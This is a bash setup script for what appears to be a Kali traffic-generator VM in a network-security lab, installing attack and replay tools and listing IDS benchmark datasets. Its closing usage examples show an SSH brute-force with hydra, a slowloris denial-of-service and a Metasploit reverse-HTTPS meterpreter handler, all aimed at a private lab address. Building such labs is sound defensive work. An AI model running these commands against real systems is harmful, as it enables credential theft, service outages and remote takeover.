#!/bin/bash
# =============================================================================
# setup_traffic_gen.sh — Software provisioning for Traffic Generator (VM 400)
# =============================================================================
# Run INSIDE: VM 400 (traffic-gen / Kali Linux) as root
#
# Installs: tcpreplay, hydra, slowloris, metasploit (pre-installed on Kali),
#           selenium, chromium-driver, locust
#
# Downloads: Benchmark PCAP datasets for replay
# =============================================================================
set -euo pipefail

echo "============================================"
echo " Traffic Generator Setup — VM 400"
echo "============================================"

# --- System packages ---
echo "[1/5] Updating system packages..."
apt update && apt upgrade -y

echo "[2/5] Installing traffic tools..."
apt install -y \
    tcpreplay \
    hydra \
    hping3 \
    chromium-driver \
    python3 python3-pip python3-venv

# slowloris (Python-based)
pip3 install slowloris

echo "[3/5] Setting up Python automation environment..."
python3 -m venv ~/traffic-env
source ~/traffic-env/bin/activate
pip install --upgrade pip
pip install \
    selenium \
    locust \
    requests

echo "[4/5] Creating dataset directory..."
mkdir -p /datasets
echo "  Download benchmark PCAPs into /datasets/:"
echo "    - USTC-TFC2016:        https://github.com/yungshenglu/USTC-TFC2016"
echo "    - CIC-IDS2017:         https://www.unb.ca/cic/datasets/ids-2017.html"
echo "    - CIRA-CIC-DoHBrw-2020: https://www.unb.ca/cic/datasets/dohbrw-2020.html"

echo "[5/5] Verifying Metasploit (pre-installed on Kali)..."
if command -v msfconsole &>/dev/null; then
    echo "  ✓ Metasploit available"
else
    echo "  [!] Metasploit not found. Install with: apt install metasploit-framework"
fi

echo ""
echo "============================================"
echo " ✓ Traffic generator setup complete"
echo "============================================"
echo ""
echo "Usage examples:"
echo "  # Replay benchmark PCAP"
echo "  tcpreplay --intf1=eth0 --multiplier=2.0 --loop=5 /datasets/CIC-IDS2017-Friday.pcap"
echo ""
echo "  # SSH brute force"
echo "  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.110.101"
echo ""
echo "  # HTTPS slowloris"
echo "  slowloris 10.10.110.101 -p 443"
echo ""
echo "  # Metasploit C2 beacon"
echo "  msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; run'"
